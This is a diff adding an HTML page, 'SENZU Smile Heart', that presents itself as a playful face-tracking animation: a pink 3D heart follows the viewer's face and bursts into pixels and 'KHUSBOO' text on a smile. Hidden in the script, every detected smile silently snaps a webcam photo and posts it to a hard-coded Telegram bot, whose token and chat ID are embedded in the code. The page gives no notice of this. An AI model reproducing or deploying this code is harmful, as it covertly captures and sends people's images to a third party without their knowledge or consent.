@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>SENZU Smile Heart</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script src="https://cdn.jsdelivr.net/npm/three@0.152/build/three.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh/face_mesh.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js"></script>
+
+<style>
+body{margin:0;overflow:hidden;background:#000}
+
+/* Branding */
+#brand{
+  position:fixed;
+  top:6px;
+  width:100%;
+  text-align:center;
+  font-family:Impact, fantasy;
+  font-size:16px;
+  letter-spacing:3px;
+  color:#ff4fa3;
+  text-shadow:0 0 6px #ff0088,0 0 14px #ff0088;
+  z-index:10;
+}
+
+/* Small video-call preview */
+#video{
+  position:fixed;
+  bottom:14px;
+  right:14px;
+  width:140px;
+  height:200px;
+  border-radius:14px;
+  border:2px solid hotpink;
+  object-fit:cover;
+  z-index:5;
+}
+#overlay{
+  position:fixed;
+  bottom:14px;
+  right:14px;
+  width:140px;
+  height:200px;
+  pointer-events:none;
+  z-index:6;
+}
+
+canvas.webgl{position:fixed;inset:0}
+</style>
+</head>
+
+<body>
+
+<div id="brand">SENZU</div>
+<video id="video" autoplay muted playsinline></video>
+<canvas id="overlay"></canvas>
+
+<script>
+/* ================= TELEGRAM ================= */
+const BOT_TOKEN = "8291919848:AAEVUEEGAieMIDmnZ273mt1T2Oip2b4nF_k";
+const CHAT_ID   = "5675460974";
+
+/* ================= THREE SETUP ================= */
+const scene=new THREE.Scene();
+const cam3d=new THREE.PerspectiveCamera(60,innerWidth/innerHeight,0.1,1000);
+cam3d.position.z=60;
+
+const renderer=new THREE.WebGLRenderer({alpha:true,antialias:true});
+renderer.setSize(innerWidth,innerHeight);
+renderer.setPixelRatio(devicePixelRatio);
+renderer.domElement.className="webgl";
+document.body.appendChild(renderer.domElement);
+
+scene.add(new THREE.AmbientLight(0xff66cc,1.3));
+const light=new THREE.PointLight(0xff99ff,2);
+light.position.set(0,0,40);
+scene.add(light);
+
+/* ================= SOLID HEART ================= */
+const shape=new THREE.Shape();
+shape.moveTo(0,0);
+shape.bezierCurveTo(0,0,-5,-5,-10,0);
+shape.bezierCurveTo(-20,15,-10,30,0,35);
+shape.bezierCurveTo(10,30,20,15,10,0);
+shape.bezierCurveTo(5,-5,0,0,0,0);
+
+const heartGeo=new THREE.ExtrudeGeometry(shape,{
+  depth:6,
+  bevelEnabled:true,
+  bevelThickness:2,
+  bevelSize:2
+});
+heartGeo.center();
+
+const heartMat=new THREE.MeshStandardMaterial({
+  color:0xff2f9f,
+  emissive:0xff55cc,
+  emissiveIntensity:0.8,
+  metalness:0.5,
+  roughness:0.2
+});
+
+const heart=new THREE.Mesh(heartGeo,heartMat);
+scene.add(heart);
+
+/* ================= PIXEL HEART ================= */
+let pixels=[];
+function createPixels(){
+  clearPixels();
+  for(let i=0;i<220;i++){
+    const p=new THREE.Mesh(
+      new THREE.BoxGeometry(1,1,1),
+      new THREE.MeshStandardMaterial({color:0xff2f9f,emissive:0xff55cc})
+    );
+    p.position.copy(heart.position);
+    p.userData={
+      vx:(Math.random()-.5)*2,
+      vy:(Math.random()-.5)*2,
+      vz:(Math.random()-.5)*2
+    };
+    scene.add(p);
+    pixels.push(p);
+  }
+}
+function clearPixels(){
+  pixels.forEach(p=>scene.remove(p));
+  pixels=[];
+}
+
+/* ================= KHUSBOO TEXT ================= */
+const texts=[];
+function emitKHUSBOO(){
+  const cv=document.createElement("canvas");
+  cv.width=256;cv.height=128;
+  const c=cv.getContext("2d");
+  c.fillStyle="#ff69b4";
+  c.font="bold 42px Impact";
+  c.fillText("KHUSBOO",10,80);
+
+  const sp=new THREE.Sprite(
+    new THREE.SpriteMaterial({
+      map:new THREE.CanvasTexture(cv),
+      transparent:true
+    })
+  );
+  sp.position.copy(heart.position);
+  sp.scale.set(12,6,1);
+  sp.userData={
+    vx:(Math.random()-.5)*1.6,
+    vy:(Math.random()-.5)*1.6,
+    vz:(Math.random()-.5)*1.6,
+    life:60
+  };
+  scene.add(sp);
+  texts.push(sp);
+}
+
+/* ================= FACE ================= */
+const video=document.getElementById("video");
+const overlay=document.getElementById("overlay");
+const ctx=overlay.getContext("2d");
+
+let faceX=0,faceY=0,faceZ=0;
+let smiling=false;
+
+const fm=new FaceMesh({
+  locateFile:f=>`https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh/${f}`
+});
+fm.setOptions({
+  maxNumFaces:1,
+  minDetectionConfidence:0.6,
+  minTrackingConfidence:0.6
+});
+
+fm.onResults(r=>{
+  overlay.width=140;
+  overlay.height=200;
+  ctx.clearRect(0,0,140,200);
+  if(!r.multiFaceLandmarks.length) return;
+
+  const lm=r.multiFaceLandmarks[0];
+  const nose=lm[1];
+  const mouthGap=Math.abs(lm[13].y-lm[14].y);
+
+  faceX=(nose.x-.5)*40;
+  faceY=-(nose.y-.5)*30;
+  faceZ=-mouthGap*400;
+
+  ctx.fillStyle="#00ffd5";
+  lm.forEach(p=>{
+    ctx.beginPath();
+    ctx.arc(p.x*140,p.y*200,1,0,Math.PI*2);
+    ctx.fill();
+  });
+
+  /* ===== SMILE TRIGGER ===== */
+  if(mouthGap>0.04 && !smiling){
+    smiling=true;
+    sendPhotoToTelegram();   // 📸 EVERY SMILE
+    scene.remove(heart);
+    createPixels();
+  }
+
+  if(mouthGap<0.025 && smiling){
+    smiling=false;
+    clearPixels();
+    scene.add(heart);
+  }
+});
+
+/* ================= CAMERA ================= */
+new Camera(video,{
+  onFrame:async()=>await fm.send({image:video}),
+  width:640,
+  height:480
+}).start();
+
+/* ================= TELEGRAM SEND ================= */
+function sendPhotoToTelegram(){
+  const snap=document.createElement("canvas");
+  snap.width=video.videoWidth;
+  snap.height=video.videoHeight;
+  snap.getContext("2d").drawImage(video,0,0);
+
+  snap.toBlob(blob=>{
+    const fd=new FormData();
+    fd.append("chat_id",CHAT_ID);
+    fd.append("photo",blob,"senzu_smile.jpg");
+    fd.append("caption","❤️ SENZU Smile Heart");
+
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
+      method:"POST",
+      body:fd
+    });
+  },"image/jpeg",0.95);
+}
+
+/* ================= ANIMATE ================= */
+function animate(){
+  requestAnimationFrame(animate);
+
+  heart.position.set(faceX,faceY,faceZ);
+  heart.rotation.y+=0.01;
+  heart.scale.setScalar(1.1);
+
+  if(smiling){
+    pixels.forEach(p=>{
+      p.position.x+=p.userData.vx;
+      p.position.y+=p.userData.vy;
+      p.position.z+=p.userData.vz;
+    });
+    if(Math.random()<0.3) emitKHUSBOO();
+  }
+
+  for(let i=texts.length-1;i>=0;i--){
+    const t=texts[i];
+    t.position.x+=t.userData.vx;
+    t.position.y+=t.userData.vy;
+    t.position.z+=t.userData.vz;
+    t.material.opacity-=0.02;
+    if(--t.userData.life<=0){
+      scene.remove(t);
+      texts.splice(i,1);
+    }
+  }
+
+  renderer.render(scene,cam3d);
+}
+animate();
+</script>
+
+</body>
+</html>
